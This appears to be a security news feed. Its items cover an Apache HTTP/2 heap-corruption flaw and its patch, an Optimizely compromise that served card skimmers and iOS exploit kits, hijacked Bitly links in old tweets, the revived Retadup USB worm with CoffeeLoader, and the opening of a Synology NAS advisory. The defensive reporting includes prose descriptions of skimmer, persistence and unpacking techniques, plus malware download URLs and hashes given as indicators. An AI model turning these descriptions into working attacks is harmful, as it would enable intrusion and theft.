item.title: Apache HTTP/2 Flaw Sat in Web Servers Since 2023 and Ubuntu's Version Numbers Hid It
item.description:
About 1.5 million web servers run an Apache version that can let an attacker run code without logging in. Switching on HTTP/2 is enough. One line in its HTTP/2 code has written to the wrong memory since 2023.

Apache HTTP Server runs 20.6 percent of the websites whose web server is known, according to the daily count of W3Techs. The scanning company Censys counts about 166 million web addresses running on it, each a name or IP address with a port. On November 11, the Apache project published an advisory for CVE-2026-119618, the public ID for a flaw in mod_http2, the module that lets Apache speak HTTP/2, and gave it the highest rating it has, critical. The title of the advisory says what it does: heap corruption and remote code execution, in a function called assign_headers().

Remote code execution means that someone on the other side of the internet can make the server run commands of their choosing. For this flaw, an attacker needs nothing more than a server that speaks HTTP/2 and a way to reach it, which for a public website is the reason it exists.

The same scanning company found roughly 1.5 million hosts that announce an Apache version from 2.4.55 to 2.4.70, the range Apache lists as affected. It can read a version on only about 40 percent of the hosts running Apache, so that count only covers the servers that say what they run. About 40 percent of those affected hosts sit in five cloud and hosting networks: Amazon, Google, Hetzner, OVH and DigitalOcean, the places where many websites rent the server they run on.

With the older HTTP/1.1, a browser sends one request at a time over a connection and waits for the answer before it sends the next. HTTP/2 lets the browser send many requests over the same connection at once, each in its own numbered stream, so a page with fifty images does not have to fetch them one after the other. Apache handles that by handing the streams of one connection to several separate lines of work inside the same server process, which run side by side. Those are called worker threads.

A request starts with a few lines that tell the server what the browser wants, such as Host, Content-Type and Content-Length. Those lines are the headers. When a request arrives over HTTP/2, mod_http2 reads them and stores them in a table that belongs to that stream. The worker thread that picks up the request then makes its own copy of that table, and from that moment on the request is supposed to work on the copy.

Inside assign_headers() sits a small rule for one specific case. When a request says it has no body, but does carry a Content-Type header and no Content-Length, Apache adds a Content-Length of zero, so the rest of the server knows that no data will follow. The comment in the source code says exactly that. In Apache 2.4.55 through 2.4.70, the line that adds it writes into the original table instead of the copy:

1

apr_table_setn(req->headers, "Content-Length", "0");

That original lives in memory that the connection manages. As long as the table has room, the extra header fits in. When the table is full and has to grow, the worker thread takes new memory from the connection while other threads of the same connection are busy with their own streams. Nothing makes them wait for each other.

Red Hat, which ships Apache in its own Linux distribution, describes the result as one thread modifying memory that belongs to another thread. When two threads touch the same memory without taking turns, the outcome depends on which one gets there first, and that is called a race condition. Here the race damages the pool of memory the server hands out to itself while it runs, known as the heap. Apache’s advisory says that damage can lead to remote code execution.

The correction the Apache developers wrote changes that one line and nothing else in the file. The value now goes into the request’s own copy, where only that worker thread touches it:

1
2

- apr_table_setn(req->headers, "Content-Length", "0");
+ apr_table_setn(r->headers_in, "Content-Length", "0");

A small program on GitHub triggers the flaw from outside. That kind of program is called a proof of concept, and this one sends an HTTP/2 request that ends right after its headers, with a Content-Type and without a Content-Length. It fills the header table to its limit with 79 ordinary headers plus Host. In the author’s lab, Apache 2.4.70 crashes, and the memory checkers that developers use to catch these errors report corruption. The proof of concept does not show code running.

Red Hat’s page for the CVE says that public research has shown a reliable working attack on a server in its default setup with the HTTP/2 module switched on. Its security bulletin adds that an attacker can trigger the problem reliably with a carefully built series of HTTP/2 requests sent at the same time. Neither page names that research.

The first version with the flaw is Apache 2.4.55, released in January 2023, and the last one is 2.4.70. For the standalone version of the module, distributed separately as mod_h2, Apache lists 2.0.8 through 2.0.42. A server that kept Apache up to date since early 2023 has been carrying the flaw for close to four years.

This is the fifth HTTP/2 flaw on Apache’s list for 2026, and the first one Apache rates critical. The most serious before it was CVE-2026-23918 in May, rated important: a flaw where the server releases the same piece of memory twice, called a double free, with possible remote code execution.

Two teams found this flaw separately. The first report came on October 26 from Anthropic’s OSS Scanner, an opt-in scanner for open-source projects that the company launched on October 8. An AI model writes its reports, and no person checks them before they go out. Apache credits the scanner under the ID ANT-2026-MAPKT6MZ. Eight days later, on November 3, Anthony Weems and Simon Scannell of Google Cloud Vulnerability Research reported the same flaw. Apache published its advisory on November 11.

The flaw sits in the HTTP/2 module, so it only reaches servers where HTTP/2 is switched on, through h2 or h2c in a setting called Protocols. Servers that only speak HTTP/1.1 are not affected. In Apache’s own documentation, the default for that setting is Protocols http/1.1, so HTTP/2 stays off until an administrator turns it on.

On Debian, turning it on takes one command, sudo a2enmod http2. The configuration file that comes with the module starts with the line Protocols h2 h2c http/1.1. That switches on HTTP/2 over an encrypted connection (TLS), which is h2, and also h2c, which is HTTP/2 over a connection without encryption. Apache’s documentation explains that a site inherits this line from the main server configuration unless it sets a Protocols line of its own. On a fresh Debian install the module is off, so on Debian HTTP/2 is a choice the administrator made, with that one command.

Ubuntu 22.04 runs Apache 2.4.52, and Ubuntu 20.04 runs 2.4.41. Both numbers are older than 2.4.55, the first version Apache lists as affected. Both releases had the flaw anyway, and Ubuntu’s page for this CVE lists a fix for both and gives the reason. Ubuntu copied newer versions of the HTTP/2 module into the older Apache package of its stable releases, which is called backporting. The Apache version number stayed old, while the HTTP/2 code inside it was newer, including the broken line. The version number gave no warning.

An administrator who runs apache2 -v on such a server sees 2.4.52 and finds it below the affected range. Internet scans that sort servers by the version they announce make the same call. An Ubuntu 22.04 server with HTTP/2 switched on does not fall in the range from 2.4.55 to 2.4.70, so it is not in that count of 1.5 million either. Ubuntu 18.04 and older are not affected, according to the same page.

The severity score depends on who gives it. Red Hat gives the flaw 9.8 out of 10 on the CVSS scale. That score describes an attack over the network that works without an account or a click from a person on the server, and that is easy to carry out. Apache rates the flaw with a word, critical. The score that CISA, the US cybersecurity agency, added to the official CVE record is 8.1. The difference comes down to one field, the attack complexity, which is set to high in the CISA score. A race condition depends on timing, and getting the timing right takes attempts.

Red Hat makes the same distinction for its own systems. It rates the flaw Critical overall, but Important, one step lower, for Red Hat Enterprise Linux 9 and 10. On those versions each HTTP/2 stream gets its own part of the program that hands out memory, called a memory allocator, and that makes the flaw harder to exploit. Red Hat Enterprise Linux 8 and older are not affected, and the company notes that HTTP/2 module versions before 2.0.8 do not contain the code with the flaw.

On November 13, the same US agency added its own assessment to the CVE record: no exploitation seen, and not automatable, meaning the attack cannot be reliably run by a script from start to finish.

Apache released version 2.4.71 on November 11, with the corrected line. A day later, the scanning company found 2.4.71 on only about 2,000 hosts. That number says less than it seems, for the same reason as the Ubuntu version numbers. Linux distributions put the fix into their own packages and keep their own version numbers, so a patched Ubuntu or Red Hat server does not announce 2.4.71.

Where the distributions stood when this was written:

  • → Ubuntu published its security notice on November 12, with fixes for 20.04 through 26.10. Ubuntu 20.04 gets its fix through Ubuntu Pro, the paid subscription
  • → The fixed Ubuntu package is 2.4.52-1ubuntu4.27 on 22.04, 2.4.58-1ubuntu8.19 on 24.04 and 2.4.66-2ubuntu2.8 on 26.04
  • → - → Debian fixed version 12 (bookworm) with 2.4.71-1deb12u1, version 13 (trixie) with 2.4.71-1deb13u1, and testing (forky) with 2.4.71-1
  • → Red Hat shipped its first fixes on November 11, the day of Apache’s release, and by November 12 had fixes out for most affected products, with the rest still in progress
  • → Amazon Linux 2 and Amazon Linux 2023 were fixed on November 12

Administrators who built the standalone mod_h2 themselves are in a different position. Its repository has been archived since June 9, 2026, and its last release is 2.0.42, the last version Apache lists as affected. The corrected code only exists in Apache 2.4.71.

On Debian or Ubuntu, the first command below shows whether the HTTP/2 module is loaded, the second shows where Protocols is set, and the third shows the installed package version, to compare with the list above:

1
2
3

sudo apache2ctl -M | grep http2
grep -ri "Protocols" /etc/apache2/
dpkg -l apache2 | grep ^ii

On Red Hat Enterprise Linux and related systems, the company’s bulletin gives these checks. If the first line of the curl answer starts with HTTP/2, the server speaks HTTP/2:

1
2
3

grep http2 /etc/httpd/conf.modules.d/*.conf
grep -ri "Protocols" /etc/httpd/conf/httpd.conf /etc/httpd/conf.d/*.conf
curl -kI --http2 https://localhost

For a server that cannot take the update yet, the same bulletin gives a way to switch HTTP/2 off. Set the Protocols line to HTTP/1.1 only, in /etc/httpd/conf/httpd.conf or the file in /etc/httpd/conf.d/ where it is set, and restart the server:

1
2

Protocols http/1.1
sudo systemctl restart httpd

On Debian or Ubuntu, switching the module off does the same, and it also removes the Protocols line that came with it:

1
2

sudo a2dismod http2
sudo systemctl restart apache2

A Protocols line elsewhere that still names h2 does no harm once the module is off, because Apache ignores protocols it cannot provide. Visitors then connect over HTTP/1.1, and the update itself remains the fix.

Run nmap -sV against a server you own and compare the Apache version it announces with the package that is actually installed on it.

item.title: Optimizely Hack Sent Card Skimmers and iPhone Exploits to Visitors of 178 Organizations
item.description:
Optimizely Hack Sent Card Skimmers and iPhone Exploits to Visitors of 178 Organizations

178 organizations, CNN, the BBC, Zoom and KLM among them, served attacker code for about 17 hours on November 16. Opening the page was enough. It came through a testing tool and went after cards and iPhones.

On Monday evening, November 16, Scott Helme and his team at Report URI started going through copies of one small script. Their company is designed to detect exactly this kind of attack, he writes. In about 35 minutes they checked 1,611 copies, most of them found in their own collection of scanned websites, and 186 were infected. By the end of the night they had counted 188, from 178 organizations. He expects the true number to be higher, because his team could only check the copies they found in time.

That script comes from Optimizely. Large websites use it to test changes on their visitors. You see one version of a page, the next visitor sees another, and the site keeps the one that works better. The site loads the script from Optimizely’s own server, cdn.optimizely.com. Inside it is a field called Project JavaScript, where the site owner can add code of their own, and that code runs on each page where the script loads.

Someone had put their own code in that field, in the projects of 178 organizations. If you opened one of those sites that day, your browser got the attacker’s code along with the page, from a server the site already trusted. That code then fetched a second script, track.js, from an address registered at 05:23 UTC that same morning: 1688360.cc.

The list covers 20 sectors. Banking and finance leads with 32 organizations, among them Equifax and HSBC sites in 11 countries and territories. Fox News, IKEA’s home design tool, ASOS, Levi’s, Peacock, NOW TV, GitLab, Starbucks Canada, Change.org and UNICEF USA are on it too. So is Bitly, the service that turns long links into short ones.

From older public scans of those pages, the team could rebuild the day. The first infected script was still clean at 02:21 UTC and infected at 04:21. From 08:28 it loaded track.js, and the attacker kept working on that file for the rest of the day. The team counted 26 builds.

A card skimmer went in at 13:43, and a second server for the iPhone attack between 17:13 and 17:57. Between about 20:40 and 21:10 most of the infected scripts were cleaned. One, TalkTalk’s, was still infected at 21:52, and from 23:11 all of them were clean. From the first sighting to the large clean-up, that is close to 17 hours.

What the code did next depended on what you opened the page with.

On an iPhone or iPad, it read your iOS version and loaded a hidden frame, an invisible window inside the page, with an attack picked for that version:

  • → iOS 13 to 17: a kit called Coruna

  • → iOS 18: a kit called DarkSword

  • → iOS 26: it only collected details about the device, for now

On iOS 18.6 or earlier, the page reloaded once a minute to try again. The researchers call that a visible symptom.

Both kits have a history.

Google’s threat intelligence team described the first kit on March 3, 2026: 23 exploits in five chains, for iOS 13.0 up to 17.2.1. A chain is a set of holes used one after the other to take over the phone. Parts of it first turned up with the customer of a company that sells surveillance tools. Then it was found hidden on hacked Ukrainian websites, used by a group suspected of Russian espionage.

Later the first kit showed up on fake Chinese finance and crypto sites, used by a group from China that was after money. On a phone it took over, it went into crypto wallet apps and searched the notes for words like “backup phrase” and “bank account”.

The second kit followed in a report from the same team on March 18. It chains six holes in iOS 18.4 up to 18.7, three of them used as zero-days, before the maker knew they existed. A surveillance company from Turkey used it, and so did the same suspected espionage group. One of the programs it installed took iMessage and WhatsApp messages, notes and wallet data off the phone. The mobile security company Lookout wrote that the kit was built by a third party, and that there is a second-hand market for exploits like these.

The holes in both kits are closed now. The two that the second kit uses to break in through the browser were fixed in iOS 18.7.3 on December 12, 2025. Apple’s note on them says they may have been exploited in an extremely sophisticated attack against specific targeted individuals. The last of the six was fixed in iOS 26.3 on February 11, 2026, and the attack code on November 16 itself treated those two versions as patched.

So for about 17 hours, as long as the infected scripts were live, news sites, banks and shops handed out exploits linked to attacks on hand-picked targets. According to the researchers who described the kits, the first works up to iOS 17.2.1, and the second on iOS 18.4 up to 18.7, until the fix in 18.7.3.

If you typed a card into a form on one of those sites after 13:43, the skimmer was waiting for it. It watched the forms and the data the page sent out, and picked out the card number, the expiry date and the security code, the CVV. It ran each number through the Luhn check, the checksum that card numbers are built with, so it only kept numbers that could be valid. Then it sent them to card.php on 1688360.cc.

If the site used a payment window from Stripe, Adyen or a similar provider, your card was out of its reach. That window is a page from the payment company’s own server, placed inside the site, and a script on the site cannot read it. A card typed into the site’s own form fields could be read.

The code also went after crypto. It looked for wallet addresses for Bitcoin, Ethereum, Solana, Litecoin, Dogecoin and a few more, on the page, in forms and in your clipboard, and swapped them for the attacker’s. Copy an address from an infected page, or from anywhere else while that tab was open, and the address you pasted could be the attacker’s. When it swapped an address next to words about paying, it also sent the page address, the cookies it could read and a screenshot of the page to hit.php on the same server.

By 19:25 UTC the attacker’s wallets had received about 7,040 dollars, all of it within about nine hours on November 16. One of those wallets, on the TRON network, had been in use since March 2026, so not all of that money has to come from this attack. Early on November 17 the money was moved out. How many cards or iPhones were hit is not known. The researchers write that they have no way to see how many cards or cookies reached the attacker’s server, or how many iOS devices were infected.

The list has a Dutch side as well. KLM, Air France-KLM and Transavia are on it. So are ABN AMRO and its lease company, the credit card company ICS Cards and Heineken. I could not find a public statement from any of them.

Once Helme’s team was sure Optimizely was the source, they tried to reach the company through several channels with the full details. When the findings went online, nothing had come back. Optimizely’s status page later said that an outsider had used a hole in its testing product. The company told a security news site that the hole was in its Experimentation account signup flow. He writes that he does not know how the attacker got permission to change the code in so many unrelated customer projects, and that this is for Optimizely to explain.

item.title: Bitly Links in Old Burger King and McDonald's Tweets Were Taken Over 21 Months After Bitly Reported a Fix
item.description:
A Burger King link from 2011 led to a list of Nazi concentration camps on November 15. Nothing was posted from the account. Someone remade the old Bitly link, 21 months after Bitly reported a fix.

On July 24, 2011, Burger King posted a tweet about its restaurant locator, the page on its website that shows the nearest restaurant. The tweet carried a short link, bit.ly/19BFiM. On November 15, 2026, at 05:32 UTC, someone created that same short link again. From that moment on, the tweet from 2011 opened the Wikipedia list of Nazi concentration camps.

Eighteen minutes earlier, at 05:14 UTC, the same thing had happened to McDonald’s. A tweet from June 7, 2011, about an interactive billboard made by the McDonald’s team in Sweden, carried the short link bit.ly/mLWJO0. From that morning on, it opened the article on the September 11 attacks on the same site.

The tweets themselves stayed as they were in 2011, with the same text and the same date, and nothing was posted from either account. Burger King said it had nothing to do with where the links went, and that it was fixing or deleting the posts with those links.

At 06:51 UTC, 79 minutes after the link was made again, an account on X quoted the old tweet. By early afternoon that post had 2.2 million views, according to the researchers who rebuilt the timeline of that day minute by minute. At 13:45 UTC the original tweet inside it showed as unavailable. Two minutes later, the short link itself still led to the list of camps.

A short link has two parts. The first part, bit.ly, is the domain of the company that runs the service, Bitly. The part after the slash, 19BFiM, is called the back-half. Bitly keeps a record of which long web address belongs to which back-half. When someone clicks the short link, Bitly’s server looks up the back-half in that record and sends the browser on to the long address. That step is called a redirect, and it happens before the page itself starts to load.

You can watch that step without opening the page. The command below asks Bitly’s server for the short link and prints only the line that says where it sends you:

1

curl -sI https://bit.ly/19BFiM | grep -i location

The answer is one line, location:, followed by the long address. That line is all a short link is.

The tweet from 2011 only holds the short link. The address of the restaurant locator was never in the tweet. So whoever controls the back-half 19BFiM at Bitly decides where that tweet sends people today. The people behind this used accounts at Bitly, the same accounts Bitly later suspended. With those, they created a link with a back-half that had been used in 2011 and pointed it somewhere else.

Bitly lets its users pick their own back-half instead of a random one. According to Bitly’s pricing page, the free plan includes three of those custom back-halves a month. Which plan the people behind this used is not known.

According to Bitly’s own help pages, reusing an old back-half should not be possible. The page about what happens to links after an account is deleted was last updated on August 17, 2026, three months before the Burger King link changed. It says links on the bit.ly domain keep working after the account that made them is gone. Then it says: “The back-halves used on these links cannot be re-used.” That rule covers back-halves that were generated automatically and back-halves that were chosen by hand. The same page says Bitly deletes accounts on its own when they have been inactive.

At 19:13 UTC on November 15, Bitly posted a statement on X. It said it had “identified an issue that allowed bad actors to repurpose certain old, inactive links to redirect people to content unrelated to the original posts.” Bitly did not explain what the issue was. Readers added a note under the post that points to Bitly’s own documentation.

Burger King and McDonald’s were not the only ones. The links that were taken over sat in posts from 2009 to 2014, from companies, politicians and government accounts.

  • → A second Burger King post led to the page on Adolf Hitler.

  • → A 2013 post from McDonald’s Indonesia about a jingle led to an unrelated “Would you rather?” video on YouTube.

  • → A 2010 post from Bill Gates about a trip to Washington led to a Reddit page with a fake post in the name of former New York mayor Michael Bloomberg.

  • → A 2011 post from Justin Trudeau led to a vulgar audio clip.

Donald Trump’s personal account had at least a dozen posts that led somewhere else. A 2013 post against wind turbines opened a Google site called “fortnite baby” with a photo of a baby. A post about his golf course in Scotland opened a page on the Epstein files.

Also reported: a 2012 post from the FBI about computers infected in the Ghost Click case, which now led to a photo of a seal. A post from the US Department of Defense was redirected as well, and a post from Mike Pence led to the same seal page.

Ghost Click was the 2011 case against the gang behind DNS Changer. That malware changed the DNS settings on infected computers and home routers, the setting that decides which server turns a web address into the address of a machine. More than 4 million computers in over 100 countries were infected, about half a million of them in the United States, according to US authorities.

Paul Vixie’s organization ran the replacement DNS servers that kept those computers working until July 9, 2012. A post about traffic that was sent to the wrong place now sent its own readers to the wrong place.

The researchers who rebuilt the timeline went through 97 Bitly links in tweets from Trump’s account from 2009 to 2013. Bitly has a feature for that. Add a plus sign to the end of a short link, and Bitly shows a page with the destination and the date the link was created. A link in a tweet from 2011 with a creation date from this week is a link that someone made again.

40 of the 97 links were still the originals. One was blocked by Bitly as malicious or spam. Seven led somewhere other than the tweet suggested.

Four of those seven were registered on November 15 itself, between 07:49 and 09:57 UTC, and led to a Roblox profile, a video twice and an article on Trump and Jeffrey Epstein. Two had been created in January 2024 and January 2025 and led to web addresses whose names copied crypto services. One, from January 29, 2025, led to test.com. The link from January 2024 sat in a tweet on the president’s account for almost three years before it was switched off.

The day started earlier than the Burger King link. Two more links from that account, from 2013 and 2012, were created again at 23:52 UTC on November 14 and at 01:04 UTC on November 15. At 09:18 UTC a user on X explained the method in public. Three of the four links from that day followed in the next 40 minutes, at 09:36, 09:47 and 09:57 UTC.

This had happened before. In late January 2025, Bitly links in old posts from the same account were taken over to promote new memecoins, crypto tokens listed on a site called pump.fun. A 2013 post that said “Follow me on Instagram” sent people to a coin called DJT, which at one point reached a market value of 1 million dollars. At least one link in a 2013 post from Melania Trump was taken over too.

On January 30, 2025, Bitly wrote on X: “Earlier today, Bitly identified a bug that bad actors used to repurpose old, inactive links”. Shortly after came a second post: “Our engineering team implemented a code fix that has solved the issue.”

Twenty-one months and one fix later, on November 15, Bitly used almost the same words again. Whether it is the same bug or a new one, Bitly has not said.

The 97 links also showed something that is still running. 49 of them had been created again after the tweet and led where the tweet suggested. 48 of those were created on May 26, 2023, between 14:55 and 15:12 UTC, in 17 minutes. Who created them is not known. Because they go where they should, they look harmless, and at 23:35 UTC on November 15 they were still working. They sit in tweets from the account of the man who is now president.

The tweets are only the part that got seen. A short link also ends up in emails, PDF files, presentations, and on printed QR codes on posters and packaging. Bitly’s help page describes a QR code made in Bitly as a scannable form of a short link. Whoever controls the back-half controls where that printed code sends people, and a code on a poster cannot be updated.

This kind of attack has a name: broken link hijacking. A page or a post points to something outside itself, such as a domain or a short link. When that thing stops existing and someone else claims it, the visitors go to the new owner. The tweet keeps the trust it always had, because it still comes from the account of the company itself.

In October I wrote about the same pattern in Popcorn Time. Up to 3 million Windows PCs and 350,000 Macs kept asking for updates to a movie app from 2014 at web addresses that were no longer registered. A security company registered those addresses, and the requests went to that company instead.

By 19:22 UTC on November 15, both links showed Bitly’s “Link Deactivated” page, and none of the seven links in the president’s old tweets that led somewhere else redirected anymore. Bitly said it had suspended the accounts involved and was disabling the affected links. Its Trust and Safety team is working “to address the issue and strengthen protections against similar misuse in the future.”

On November 17, I opened the info pages of both links myself. bit.ly/19BFiM led to the restaurant locator again, and Bitly gave it a creation time of November 17, 2026, 03:25 UTC. bit.ly/mLWJO0 led back to the billboard article, created at 03:39 UTC the same night. That restored address even carries the tracking code a news feed added to it in 2011, so whoever restored it had the original record.

The back-half from 2011 has now been created three times: by Burger King in 2011, by whoever pointed it at the camps on November 15, and by someone in the early hours of November 17. Bitly has not named who that was.

What you can do:

  • → Before you click a bit.ly link in an old post, add a plus sign to the end of it. The page shows the destination and the creation date. A creation date that is much later than the post itself means the link was made again.

  • → If you run accounts or websites for a company or a school, make a list of the short links in old posts, newsletters, PDF files and printed material. Then check where each one goes today, and start with posts that give payment details or official notices.

  • → Remove links in old posts that no longer lead anywhere useful, or replace them with the full address.

Want to learn how to find the forgotten links in old posts and documents before someone else claims them? item.title: Retadup USB Worm Returns Seven Years After French Police Shut It Down
item.description:
A USB worm that French authorities shut down in 2019 spread again on Windows PCs, seven years later. One click on a folder was enough. This time it carried malware that unpacked itself on the graphics card.

In August 2026, Kaspersky found a new version of CoffeeLoader, a piece of malware whose job is to get onto a Windows PC and then download whatever its operators send next. Loaders like this usually arrive through email, fake download sites, malicious ads or pirated software. This one came in through Retadup, a worm that spreads over USB sticks and external drives, and that French police took offline in the summer of 2019.

Once Retadup runs on a PC, it copies itself as hidden files to the USB flash drives and external drives that are plugged in. For each folder on the drive, it puts down a shortcut, a small .lnk file that carries the folder’s name and looks like it. On the next PC, the drive looks almost the way it always did. A click on what looks like one of those folders starts the worm, and that PC is infected too, along with the next stick that goes into it.

Retadup first turned up in June 2017, in hospitals in Israel. Trend Micro found it there posing as a Windows updater, in a folder on the C: drive called C:\WinddowsUpdated, with two d’s. That first version stole saved passwords from Firefox, Opera and Chrome, recorded keystrokes, took screenshots, and searched the PC for shortcuts named after payment services such as PayPal and Western Union.

The worm was written in AutoIt, and later also in AutoHotkey, two free tools for automating tasks on Windows. Each infection consists of two files: the clean program that runs scripts, and the malicious script it runs.

By April 2018, the operators had found a different way to earn from it. A new version put XMRig on infected PCs, a program that mines the cryptocurrency Monero, and ran it inside processes such as Notepad and Explorer. The processor of each infected PC did the mining, and the coins went to the operators. The servers for that version sat on web addresses such as alphanoob.com, radnewage.com and newminersage.com.

The person who said they built it did not hide. On a throwaway Twitter account, @radblackjoker, they called Retadup their baby, wrote that they had invented the worm, and added that they would rule the world one day. The account also posted a screenshot of the worm’s control panel. When the researchers who later took Retadup apart got hold of the source code of its servers, the code showed that the screenshot was genuine.

The same nickname, rad, shows up in the paths on those servers. The researchers who first found Retadup traced its code back to the rad worm, which was passed around on criminal forums as a finished package in 2014. They also found a part in it written by another malware author.

In March 2019, Avast started following Retadup closely. Its researchers found that most of the worm’s servers were in France, and at the end of that month they contacted C3N, the cybercrime center of the French Gendarmerie. The programs on the operators’ own server turned out to be infected as well, with Neshta, a virus that attaches itself to program files.

The researchers had also found a design flaw in the way the worm talked to its server. Whoever controlled that server could send infected PCs an answer that made the worm remove itself, and the victims did not have to run any extra code for it. In July 2019, the police took over the servers and replaced them with a server of their own. One of the investigators explained in a 2020 interview how it worked: they made the worm believe an update was waiting, and the update they served was an empty file.

At the end of August 2019, the result went public. More than 850,000 infections had been cleaned up, most of them in Spanish-speaking countries in Latin America. The investigators counted infections in 140 countries, and a few hundred computers in France itself.

On one wallet alone, the researchers counted 53.72 Monero mined in nearly a month, about 4,200 dollars at the time. They expected the total to be higher, because the operators may have mined through other routes as well. On some PCs, the researchers also saw Retadup install the Stop ransomware, which locks files and asks for money to get them back, and Arkei, a program that steals passwords.

The cleanup only reached PCs that contacted the server while the police were answering. A PC that stayed offline, or a stick that sat in a drawer, never got that answer.

One of the investigators also said in 2020 that the worm’s domains had been redirected to a sinkhole, a server that takes in the traffic so it no longer reaches the operators.

In the official .com registry, two of the addresses from 2018, alphanoob.com and radnewage.com, were registered again on June 19, 2024, within 47 minutes of each other. Both went through the same registrar, a company that sells domain names. On July 4, 2026, at 17:50 UTC, both registrations were changed. At 18:23 that same evening, newblackage.com, newminersage.com and minernewage.com were registered at a second registrar, all three within the same minute. Fifteen days later, on July 19, internet-speed-check.com was registered at that second registrar. That is the address CoffeeLoader now gets its orders from.

According to the researchers who found the new version, someone started registering the old Retadup addresses again two years ago. At first, those servers handed out SmokeLoader, another loader. In early 2025, the same servers switched to CoffeeLoader.

And the old worms answered. The researchers watched a Retadup version from 2017 contact noobminer.newblackage.com. On August 6, 2026, the server told it to sleep. On August 10, it told it to download a file called update.exe from rurjfvn.rs. The commands are plain text, turned into Base64 and then into hexadecimal, two common ways of writing data as ordinary letters and numbers. The worm has used that same simple format for years.

This time the numbers are smaller. In the first three quarters of 2026, the researchers’ own security software blocked Retadup infection attempts on around 15,000 systems, most of them in Peru, Angola, Russia and Bolivia. Those are blocked attempts, and they only cover PCs that run that software. How many PCs were infected, the researchers do not say. Peru is not new. In 2019, the worm’s own server kept a separate count of the victims from Peru.

What the worm downloads now starts with an installer built with NSIS, a free tool for making Windows setup programs. The installer drops a file called 7z.dll into a temporary folder and starts it with rundll32.exe, the Windows program that runs code from DLL files, the library files that Windows programs share.

That 7z.dll is a copy of the library that comes with 7-Zip, the archive program, with part of its code replaced. The archive program itself has no flaw here. The replaced part is wrapped in Armoury, a packer: a layer of encryption that keeps security software from reading the malware until it unpacks itself on the PC. Zscaler named it in March 2025 because it posed as Armoury Crate, a utility from ASUS.

Armoury hands that unpacking to the graphics card. The older version used OpenCL, a standard way for programs to run calculations on the GPU. The new version uses OpenGL, the interface that games and 3D programs use to draw on screen. It runs a small program on the GPU, called a compute shader, that unscrambles the hidden code with a key and hands the result back. The researchers who named Armoury wrote in 2025 that this GPU step may make analysis harder in virtual machines, the test PCs where researchers run malware to see what it does.

The unpacked code is a downloader, the part that installs CoffeeLoader and fetches the rest. It copies 7z.dll to C:\ProgramData or to the user’s AppData\Local folder, into a folder with an eight-character name such as b79faace, and gives the file that same name. Those eight characters are calculated from information about the PC’s system drive.

Then it makes sure it starts again after a reboot. It adds an entry to the Run key, the list in the Windows registry of programs that start when the user logs in. That entry starts the DLL through rundll32.exe and a function called SetCodecs. It also writes a value under StartupApproved\Run, the place where Task Manager keeps track of which startup items are switched on or off. With that value in place, the entry cannot be switched off there.

After that, it starts one of five programs that come with Windows, dllhost.exe, WerFault.exe, svchost.exe, OpenWith.exe or AtBroker.exe, and moves its own code into it. From there it fetches its next part over HTTPS from api.internet-speed-check.com, posing as Firefox. It only runs what comes back if two checks pass. The first is a digital signature, a mark that only the holder of a secret key can make. The second is a checksum, a number that shows the code arrived unchanged. Only whoever holds that secret key can give it orders. The code then runs in memory.

The server was still handing out code at the end of September. In the traffic example in the new report, it answered on September 29, 2026 with 60,800 bytes of signed code. That answer came through Cloudflare, so the address of the server behind it stays hidden.

The version found in August uses a new marker in its network messages, 0xD1D57871. The old one was 0xC0FFEE42, which reads as C0FFEE.

CoffeeLoader itself does one job. It runs what its server sends: it moves that code into another running program, saves it as a program and starts it, or saves it as a DLL and starts it through rundll32.exe. The researchers do not say what the operators sent in 2026. The March 2025 report that named Armoury showed CoffeeLoader delivering Rhadamanthys, malware that steals passwords and other data from the PC. That version also had a fallback for when its servers could not be reached. It calculated a new .com address from the date, one for each day, and tried that one instead.

The worm needs that click on the shortcut because Windows no longer starts programs from a USB stick on its own. In February 2011, Microsoft started offering update KB971029 through Windows Update. It limits AutoPlay to CDs and DVDs and stops it on USB drives, external hard drives and network shares. So Retadup waits for a person to open something, and it makes that something look like a folder.

In cybersecurity, attribution is one of the hardest problems. An expired domain name goes back on sale, and whoever pays for it gets it. What we know for sure is how the malware works and when the addresses were registered, not who registered them. The researchers write that they do not know whether the worm’s author or someone else brought the servers back. None of the sources names a suspect or an arrest.

What to check on a Windows PC:

  • → In File Explorer, switch on hidden items and file name extensions. On a USB stick, a .lnk shortcut that carries the name of a folder, sometimes with a few extra characters after it, next to hidden files, is the pattern Retadup leaves. Do not open the shortcut.

  • → In Command Prompt, list the startup entries for your own account and for the PC. Look for rundll32.exe starting a DLL from a folder with an eight-character name in ProgramData or AppData\Local:

1
2

reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
  • → Once the stick has been scanned and cleaned, the hidden files and folders can be made visible again with attrib. Replace E: with the letter of the stick:
1

attrib -h -s E:\*.* /s /d

The indicators the researchers published:

  • → Retadup servers: alphanoob[.]com, newblackage[.]com, newminersage[.]com, radnewage[.]com, minernewage[.]com, rad2016.publicvm[.]com, radpal.publicvm[.]com, roro2016.linkpc[.]net

  • → CoffeeLoader server: internet-speed-check[.]com

  • → Download locations: rurjfvn[.]rs/update.exe and alphanoob[.]com/update.exe

  • → MD5 of the installers: 58886d45a0c5e802a5d0a7545c36112d and cca710c5455c1fe2732771afbac16a09. MD5 of the DLL files: 2272dde17925d6179bea6fcf4d543d20, dce55eec553f6af16ba6481eaacb8638 and 449c9e8bc6eb308aa3c46c88959e1a4f

Want to see how malware survives a reboot? Set up a Windows virtual machine in VirtualBox and watch its Run keys while you test.

item.title: Synology NAS Hole Rated 9.8 Opens Files Without a Password and Three DSM Versions Still Have No Fix
item.description:
Home NAS boxes from Synology can be opened over the network without a password, rated 9.8: files read, files overwritten. That is the factory setup. For DSM 7.2.2, 7.2.1 and 7.1 there is still no fix. And attackers already use an old Synology NAS bug, CISA says.

A NAS is a box with hard drives that sits on your home or office network, often right next to the router. It keeps what the computers and phones around it should not lose: the photos from your phone, the backups of your laptop, scanned documents, shared folders. Synology makes these boxes, and the software on them is called DSM, short for DiskStation Manager. You log into it through a web page, and from there you manage the files, the users and the apps on the box.

# TL;DR

This week Synology warned about a hole in DSM with the number CVE-2026-120382. It got a score of 9.8 out of 10, and Synology put it in its highest category, Critical.

That score comes from a short line in the advisory: AV:N/AC:L/PR:N/UI:N. Each part says something about the attack. It comes in over the network and is not hard to do, the attacker needs no account on your NAS, and you do not have to click or open anything for it to work. What the attacker gets, according to Synology, is your files to read, the possibility to write files onto the box, and the possibility to knock it offline.

